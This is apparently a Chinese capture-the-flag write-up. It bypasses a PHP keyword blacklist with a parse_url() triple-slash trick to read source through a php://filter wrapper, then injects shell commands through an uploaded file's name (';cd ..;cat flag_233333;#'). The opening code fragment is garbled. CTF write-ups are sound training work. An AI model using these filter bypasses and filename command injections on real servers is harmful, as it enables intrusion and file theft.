function Filter($string)
{
global $mysqli;
$blacklist = "information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password";
$whitelist = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+><";

        Hacker();

}

    return $mysqli->real_escape_string($string);

    return "";
}
}

我们先尝试直接使用伪协议来直接读上面的flag文件： 

/user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg

发现被拦截了，那么我们就要再回头审计一下代码，寻找可以利用的地方来绕过拦截。

我们看这串代码：

可以看到一个眼熟的函数parse_url()，这个函数作用就是把url的各个部分进行拆分并放入数组中，下面给出一个例子： 

<?php
$url = 'http://username:password@hostname/path?arg=value#anchor';
print_r(parse_url($url));
echo parse_url($url, PHP_URL_PATH);
?>
结果----------------------------------------------------------------------------------------------------
Array
(
[scheme] => http
[host] => hostname
[user] => username
[pass] => password
[path] => /path
[query] => arg=value
[fragment] => anchor
)
/path

可以看到这个函数将一个完整的url拆分成了各个部分，其中键query对应的数据是参数以及后面的变量，也就是问号后面的东西，**?arg=value。**

而我们前面所看到的代码正式对这一部分进行了过滤检查，因为我们使用伪协议也就是参数后面的变量里有名单上的字符，所以被拦截，无法直接读取源码。

那么如何绕过这个函数呢？我们发现，如果我们这样构造url变量： 

<?php
$url = '//www.example.com/path?googleguy=googley';

// 在 5.4.7 之前这会输出路径 "//www.example.com/path"
var_dump(parse_url($url));
?>

这样就能造成绕过，而如果我们这样构造： 

///www.example.com/path?googleguy=googley

那么该函数就会返回false，从而绕过检测，所以我们可以这样构造 

///user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg

成功得到源码：

这样一串代码，原来是文件名命令执行，也就是说要在文件名上进行修改来获取flag，接下来就是招真正的上传点了，回顾之前代码中提示的页面信息，找到真正的上传点/user.php?page=m4aaannngggeee

接下来就是上传文件并抓包修改文件名。
将文件名改为;ls;# 

注意这里的#是为了注释掉cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/".$filename." | base64 -w 0");里的" | base64 -w 0");这一部分

发现flag不再这里，切换到根目录寻找，这里/被禁用了，我们可以使用cd ..（返回上一层目录）来代替。 

payload：;cd ..;ls;#

找到flag，构造payload 

;cd ..;cat flag_233333;#

读取到flag。
